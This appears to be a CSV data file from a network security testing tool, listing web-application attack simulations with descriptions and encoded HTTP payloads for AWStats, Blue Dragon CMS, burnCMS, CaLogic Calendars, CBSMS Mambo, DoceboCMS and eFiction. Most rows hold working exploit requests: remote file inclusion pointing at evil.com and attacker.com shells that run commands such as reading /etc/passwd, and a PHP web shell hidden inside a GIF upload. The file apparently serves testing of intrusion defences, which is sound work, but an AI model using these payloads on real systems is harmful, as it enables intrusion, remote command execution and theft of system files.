XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
awstats_cmi_c.xml,AWStats Logfile Parameter Remote Command Execution Vulnerability,"This threat sends a crafted HTTP GET query containing a shell command which is executed by the server via the ""logfile"" parameter which does not properly filter shell metacharacters. AWStats is a webapplication with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿bluedragoncms_cmi.xml,Php Blue Dragon CMS 2.9 Remote File Include Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via popup_finduser.phps ""vsDragonRootPath"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"GET /dragon/public_includes/pub_popup/popup_finduser.php?vsDragonRootPath=http||3A ||//www.evil.com/shell.php?cmd=cat%20/etc/passwd HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
bluedragoncms_cmi.xml,Php Blue Dragon CMS 2.9 Remote File Include Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via popup_finduser.phps ""vsDragonRootPath"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿burncms_cmi_a.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  authuser.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,"GET /%2Flib%2Fauthuser.php%3Froot%3DShell HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.site.com||0D 0A 0D 0A||"
burncms_cmi_a.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  authuser.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿burncms_cmi_b.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  misc.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,"GET /%2Flib%2Fmisc.php%3Froot%3DShell HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.site.com||0D 0A 0D 0A||"
burncms_cmi_b.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  misc.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿burncms_cmi_c.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  connect.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,"GET /%2Flib%2Fconnect.php%3Froot%3DShell HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.site.com||0D 0A 0D 0A||"
burncms_cmi_c.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  connect.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿burncms_cmi_d.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  mysql.class.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,"GET /%2Flib%2Fmysql.class.php%3Froot%3DShell HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.site.com||0D 0A 0D 0A||"
burncms_cmi_d.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  mysql.class.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿burncms_cmi_e.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  postgres.class.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,"GET /%2Flib%2Fpostgres.class.php%3Froot%3DShell HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.site.com||0D 0A 0D 0A||"
burncms_cmi_e.xml,burnCMS <= 0.2(root)Remote File Include Vulnerabilities,This threat demonstrates a remote file inclusion flaw against  postgres.class.php's root parameter. this threat is delivered via HTTP port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿calogic_calander_cmi.xml,CaLogic Calendars 1.2.2 Remote File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via reconfig.php's $_GLOBAL parameter. CaLogic Calendars is a web based application which typically listens on port 80.,HTTP,TCP,"GET /%2Freconfig.php%3FGLOBALS%5BCLPath%5D%3Dhttp%3A%2F%2Fwww.attacker.com%2Fcmd.txt%3F%26cmd%3Dls HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
calogic_calander_cmi.xml,CaLogic Calendars 1.2.2 Remote File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via reconfig.php's $_GLOBAL parameter. CaLogic Calendars is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿cbsms_mambo_cmi.xml,CBSMS Mambo Module 1.0  Remote File Include Vulnerabilities,"This threat sends a crafted HTTP GET request containing a url for a file to be included by the script via mod_cbsms_messages.phps
""mosConfig_absolute_path"" parameter. CMSMS is a web based application which typically listens on port 80.",HTTP,TCP,"GET /cbsms%2Fmod_cbsms_messages.php%3FmosConfig_absolute_path%3Dhttp%3A%2F%2Fwww.attacker.com%2F HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
cbsms_mambo_cmi.xml,CBSMS Mambo Module 1.0  Remote File Include Vulnerabilities,"This threat sends a crafted HTTP GET request containing a url for a file to be included by the script via mod_cbsms_messages.phps
""mosConfig_absolute_path"" parameter. CMSMS is a web based application which typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿docebocms_cmi.xml,DoceboCMS Arbitrary PHP File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via lib.php's GLOBAL parameter. DoceboCMS is a web based application which typically listens on port 80.,HTTP,TCP,"GET /%2FdoceboCore%2Flib%2Flib.php%3FGLOBALS%5Bwhere_framework%5D%3Dhttp%3A%2F%2Fwww.attacker.com%2Fevil.php HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
docebocms_cmi.xml,DoceboCMS Arbitrary PHP File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via lib.php's GLOBAL parameter. DoceboCMS is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿docebocms_cmi_b.xml,DoceboCMS Arbitrary PHP File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via lib.teleskill.php's GLOBAL parameter. DoceboCMS is a web based application which typically listens on port 80.,HTTP,TCP,"GET /%2FdoceboScs%2Flib%2Flib.teleskill.php%3FGLOBALS%5Bwhere_scs%5D%3Dhttp%3A%2F%2Fwww.attacker.com%2Fevil.php HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
docebocms_cmi_b.xml,DoceboCMS Arbitrary PHP File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via lib.teleskill.php's GLOBAL parameter. DoceboCMS is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿efiction_cmi.xml,eFiction Image Upload Arbitrary Command Execution,This threat posts a malicious image file which allows the execution of arbitrary commands.,HTTP,TCP,"POST /efiction/user.php?action=manageimages&upload=upload HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*||0D 0A ||Referer||3A || http||3A ||//www.example.com||3A ||80/efiction//user.php?action=manageimages&upload=upload||0D 0A ||Accept-Language||3A || en||0D 0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------7d529a1d23092a||0D 0A ||Accept-Encoding||3A || text/plain||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1)||0D 0A ||Host||3A || www.example.com||3A ||80||0D 0A ||Content-Length||3A || 1094||0D 0A ||Cookie||3A || ||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Cache-Control||3A || no-cache||0D 0A 0D 0A ||-----------------------------7d529a1d23092a||0A ||Content-Disposition||3A || form-data||3B || name=||22 ||upfile||22 3B || filename=||22 ||C||3A ||\suntzu.php||22 0A ||Content-Type||3A || image/gif||0A 0A ||GIF89a||01 00 01 00 F7 00 00 A4 B6 A4 16 00 00 F4 00 00 ||w||00 00 ||k||00 ||L||15 00 00 F4 00 ||iw||00 00 F8 00 ||nb||00 00 15 00 ||g||00 00 00 ||4||00 ||u||00 00 00 00 00 ||a||C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 89 00 00 1C 00 00 00 00 00 00 00 00 A9 00 00 || ||00 00 00 00 00 00 00 00 ||o||00 00 00 00 00 00 00 00 00 00 00 ||V||00 00 00 00 00 ||<?php error_reporting(0)||3B ||ini_set(||22 ||max_execution_time||22 ||,0)||3B ||system($_GET[cmd])||3B ||?>8||00 00 E5 00 00 12 00 00 00 00 00 00 00 98 01 00 CC 00 00 15 00 00 00 ||X||00 10 E6 00 04 12 00 10 00 00 04 05 00 01 90 00 00 F6 00 00 ||w||00 00 C8 00 10 D5 00 E8 F5 00 12 ||w||00 00 FF 00 13 FF 00 ||l||FF 00 ||l||FF 00 ||tj||00 03 16 00 00 F4 00 00 ||w||00 00 C4 00 ||0||1E 00 ||u||E5 00 15 ||w||00 00 00 00 00 00 00 00 15 00 00 00 00 00 00 00 DC 00 00 E7 00 00 12 00 00 00 ||p||00 01 ||Y||00 00 18 00 00 00 00 00 04 00 88 01 00 E8 05 00 12 01 00 00 ||l||00 04 E3 00 ||B||12 00 ||n||00 00 ||t~||00 ||0||00 00 87 00 00 ||n||C0 00 ||t||00 00 FF 00 00 FF 00 00 FF 00 00 FF FF 00 D6 FF 00 ||2||FF 00 ||n||FF 00 ||t||FF 00 ||l||FF 00 ||[||FF 00 E5 FF 00 ||w||00 00 ||S||00 00 15 00 00 ||S||00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 00 00 00 00 00 00 00 00 00 ||k||00 00 00 00 00 00 00 00 00 00 00 ||X||00 00 03 00 F0 00 00 15 00 00 00 06 00 00 F6 00 00 E4 00 00 ||w||00 00 0F 00 00 1E 00 00 E5 00 00 ||w||00 00 00 00 00 01 00 00 00 00 00 00 00 00 F8 ||t||00 ||b||E7 00 01 12 00 00 00 00 00 C8 ||h||00 ||(2||15 E5 E6 00 ||ww||A4 00 FF E5 00 FF 12 00 FF 00 00 FF 00 00 ||l||00 00 ||[||00 00 E5 00 00 ||w||FC F8 ||6||F7 ||b||00 12 15 00 00 00 00 05 00 ||6||90 01 00 F6 00 00 ||w||00 00 C8 04 D8 D5 ||)||ED F5 E5 12 ||ww||00 FF 94 FF FF E7 FF FF 12 FF FF 00 FF ||jd||00 16 ||/||00 F4 E6 00 ||ww||00 E0 00 9C 18 00 E8 E5 00 12 ||w||00 00 00 FF ||N||00 FF ||!||15 FF ||L||00 FF 00 00 ||o||7C 00 10 E8 00 E5 12 00 ||w||00 F8 00 ||{b||00 E0 15 00 ||N||00 00 00 00 98 B0 01 E8 E8 00 12 12 00 00 00 ||d||98 ||o/||10 10 E6 E5 E5 ||www||00 10 ||R||00 E4 E9 00 ||N||12 00 00 00 ||a ||C8 00 02 FF ||lO||FF 00 00 ||i||00 1C 00 01 E9 ||a||00 12 00 00 00 ||)||94 00 00 E7 00 00 12 00 00 00 00 00 00 ||o||00 01 10 00 00 E5 00 00 ||w||00 A0 00 00 3A 00 00 ||P||00 00 00 00 00 00 01 00 ||0||00 00 00 00 00 ||i||00 00 ||a`||00 ||t||F1 00 ||t||15 00 ||i||00 00 00 F0 00 00 AA 00 02 ||G||00 00 00 ||!||F9 04 00 00 00 00 00 ||,||00 00 00 00 01 00 01 00 07 08 04 00 01 04 04 00 3B 00 0A ||-----------------------------7d529a1d23092a||0A ||Content-Disposition||3A || form-data||3B || name=||22 ||submit||22 0A 0A ||upload||0A ||-----------------------------7d529a1d23092a--||0A ||GET /efiction/stories/1/images/suntzu.php?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1||0D 0A ||Host||3A || www.aculei.net||3A ||80||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||"
